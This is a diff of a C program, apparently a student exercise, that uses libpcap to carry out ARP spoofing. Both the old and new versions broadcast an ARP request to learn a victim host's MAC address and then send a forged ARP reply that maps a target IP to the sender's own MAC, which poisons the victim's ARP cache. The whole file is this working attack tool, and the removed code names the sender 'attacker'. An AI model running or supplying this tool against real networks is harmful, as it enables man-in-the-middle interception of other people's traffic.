@@ -1,133 +1,134 @@
-#include <netdb.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/fcntl.h>
-#include <sys/errno.h>
-#include <sys/ioctl.h>
+#include <pcap.h>
 #include <sys/socket.h>
-#include <arpa/inet.h>
+#include <sys/ioctl.h>
 #include <net/if.h>
 #include <stdio.h>
-#include <pcap.h>
-#include <netinet/if_ether.h>
-#include <net/if_arp.h>
+#include <string.h>
 #include <stdlib.h>
-#include <errno.h>
-#include <netdb.h>
-#include <sys/types.h>
-#include <netinet/in.h>
+#include <stdint.h>
+#include <ifaddrs.h>
+#include <arpa/inet.h>
+#include <linux/if.h>
+#include <uchar.h>
 
-unsigned char broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-unsigned char blank[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-unsigned char arp_request[2] = {0x00, 0x01};
-unsigned char arp_reply[2] = {0x00, 0x02};
 
-typedef unsigned char BYTE;
+uint8_t my_ip[4];
+uint8_t my_mac[6];
+uint8_t sender_ip[4];
+uint8_t target_ip[4];
+uint8_t sender_mac[6];
 
-void checkHostName(int hostname) 
-{ 
-    if (hostname == -1) 
-    { 
-        perror("gethostname"); 
-        exit(1); 
-    } 
-} 
+typedef struct eth_header {
+   uint8_t dst_mac[6];   //arp_req:FF~, arp_rep:mac
+   uint8_t src_mac[6];
+   uint16_t ethet_type;   //arp:0x0806
+   unsigned char arp_data[28];
+   uint8_t dm[18];
+}ETH;
 
-void checkHostEntry(struct hostent * hostentry) 
-{ 
-    if (hostentry == NULL) 
-    { 
-        perror("gethostbyname"); 
-        exit(1); 
-    } 
-} 
+typedef struct arp_header {
+   uint16_t hw_type;
+   uint16_t prot_type;    //IP4 0x0800
+   uint8_t Hlen;          //이더넷 6
+   uint8_t Plen;         //IP4 4
+   uint16_t op_code;      //arp_req:1, rep:2
+   uint8_t sender_mac[6];
+   uint8_t sender_ip[4];
+   uint8_t target_mac[6];
+   uint8_t target_ip[4];
+}ARP;
 
-void checkIPbuffer(char *IPbuffer) 
-{ 
-    if (NULL == IPbuffer) 
-    { 
-        perror("inet_ntoa"); 
-        exit(1); 
-    } 
-} 
-
-void Packet_Gen(unsigned char *eth_dmac, unsigned char * eth_smac, unsigned char *opcode, unsigned char *sender_mac, unsigned char *sender_ip, unsigned char *target_mac, unsigned char *target_ip, u_char *packet) {
-  memcpy(packet, eth_dmac, 6);
-  memcpy(packet+6, eth_smac, 6);
-  u_char tmp[8]={0x08,0x06,0x00,0x01,0x08,0x00,0x06,0x04};
-  for(int i=12;i<20;i++) packet[i]=tmp[i];
-  memcpy(packet+20, opcode, 2);
-  memcpy(packet+22, sender_mac, 6);
-  memcpy(packet+28, sender_ip, 4);
-  memcpy(packet+32, target_mac, 6);
-  memcpy(packet+38, target_ip, 4);
-  
+void find_mymac(char *dev_name)
+{
+   struct ifreq s;
+   int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
+   strcpy(s.ifr_name, dev_name);
+   ioctl(fd, SIOCGIFHWADDR, &s);
+   memcpy(my_mac, s.ifr_hwaddr.sa_data, 6);
 }
 
-int main(int argc, char * argv[]) {
-  struct ifreq ifr;
-  struct ether_arp packet;
-  struct ether_header header;
-  struct hostent *host_entry;
-  struct bpf_program fp;
-  struct pcap_pkthdr *head;
-  const BYTE *data;
-  u_char* frametype=(unsigned char*)"8060";
-  u_char* sending_packet;
-  char hostbuffer[256];
-  char* IPbuffer;
-  char filter[100]="ether proto 0x0806 and ether dst ";
-  bpf_u_int32 net;
-  u_int8_t senderip[4], targetip[4], attackerip[4];
-  int s, i, packlen, hostname;
 
-  if ((s = socket(AF_INET, SOCK_STREAM,0)) < 0) {
-    perror("socket");
-    return -1;
-  }
+void find_myip()
+{
+   struct ifaddrs *ifap, *ifa;
+   struct sockaddr_in *sa;
+   char *addr;
+   int tmp = 0;
+   getifaddrs(&ifap);
+   for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
+      if (ifa->ifa_addr->sa_family == AF_INET) {
+         sa = (struct sockaddr_in *) ifa->ifa_addr;
+      }
+   }
+   memcpy(my_ip, &(sa->sin_addr.s_addr), 4);
+   freeifaddrs(ifap);
+}
 
-  char* dev = argv[1];
-  char errbuf[PCAP_ERRBUF_SIZE];
-  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-  if (handle == NULL) {
-    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-    return -1;
-  }
-  
-  strcpy(ifr.ifr_name, argv[1]);
-  if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
-    perror("ioctl");
-    return -1;
-  }
-  
-  packlen = sizeof(ether_header) + sizeof(ether_arp);
-  unsigned char *hwaddr = (unsigned char *)ifr.ifr_hwaddr.sa_data;
-  unsigned char *attacker_MAC;
-  inet_pton(AF_INET, argv[2], senderip);
-  inet_pton(AF_INET, argv[3], targetip);
-  header.ether_type=ETHERTYPE_ARP;
-  hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
-  checkHostName(hostname); 
-  host_entry = gethostbyname(hostbuffer); 
-  checkHostEntry(host_entry); 
-  IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
-  inet_pton(AF_INET, IPbuffer, attackerip);
-  strcat(filter, (char*)hwaddr);
-  pcap_compile(handle, &fp, filter, 0, net);
-  pcap_setfilter(handle, &fp);
+void get_sender_mac(pcap_t *handle)
+{
+   struct pcap_pkthdr *header;
+   const uint8_t *data;
+   while(1) {
+      pcap_next_ex(handle, &header, &data);
+      if(!memcmp(data+12, "\x08\x06", 2)) {
+         printf("Length : %d\n", header->caplen);
+         memcpy(sender_mac, data +6, 6);
+         break;
+      }
+   }
+}
 
-  Packet_Gen(broadcast, hwaddr, arp_request, hwaddr, attackerip, blank, senderip, sending_packet);
-  //printf("%s", sending_packet);
-//sending packet generation
-//packet sending&getting reply
-  pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));
-  int res = pcap_next_ex(handle, &head, &data);
-  unsigned char* sender_mac = (unsigned char*)data+22;
-  Packet_Gen(sender_mac, hwaddr, arp_reply, hwaddr, targetip, sender_mac, senderip, sending_packet);
+void arp_sending(pcap_t *handle,int opcode, uint8_t *sender_mac, uint8_t *sender_ip, uint8_t *target_mac, uint8_t *target_ip){
+   ETH eth;
+   ARP arp;
+   if(opcode == 1){
+      memcpy(eth.dst_mac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+      memcpy(arp.target_mac, "\x00\x00\x00\x00\x00\x00", 6);
+   }
+      
+   else{
+      memcpy(eth.dst_mac, target_mac, 6);
+      memcpy(arp.target_mac, target_mac, 6);
+   }
+      
+   memcpy(eth.src_mac, sender_mac, 6);
+   eth.ethet_type = ntohs(0x0806);
+   arp.hw_type = ntohs(0x0001);
+   arp.prot_type = ntohs(0x0800);
+   arp.Hlen = 0x06;
+   arp.Plen = 0x04;
+   arp.op_code = ntohs(opcode);
+   memcpy(arp.sender_mac, sender_mac, 6);
+   memcpy(arp.sender_ip, sender_ip, 4);
+   memcpy(arp.target_ip, target_ip, 4);
+   memcpy(eth.arp_data, &arp, sizeof(arp));
+   pcap_sendpacket(handle, (const unsigned char*)&eth, sizeof(eth));
+}
 
-//sending false packet
-  pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));
-  close(s);
-  
-  return 0;
+
+
+int main(int argc, char* argv[])
+{
+   char * dev, errbuf[PCAP_ERRBUF_SIZE];
+   dev = pcap_lookupdev(errbuf);
+   if (dev == NULL)
+   {
+      fprintf(stderr, "Cannot Open Device : %s\n", errbuf);
+      return 0;
+   }
+   pcap_t * handle;
+   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+   if (handle == NULL)
+   {
+      fprintf(stderr, "Cannot Open Device %s\n %s\n", dev, errbuf);
+      return 0;
+   }
+   inet_pton(AF_INET, argv[2], sender_ip);
+   inet_pton(AF_INET, argv[3], target_ip);
+   find_myip();
+   find_mymac(argv[1]);
+   arp_sending(handle, 1, my_mac, my_ip, NULL, sender_ip);
+   get_sender_mac(handle);
+   arp_sending(handle, 2, my_mac, target_ip, sender_mac, sender_ip);
+   return 0;
 }
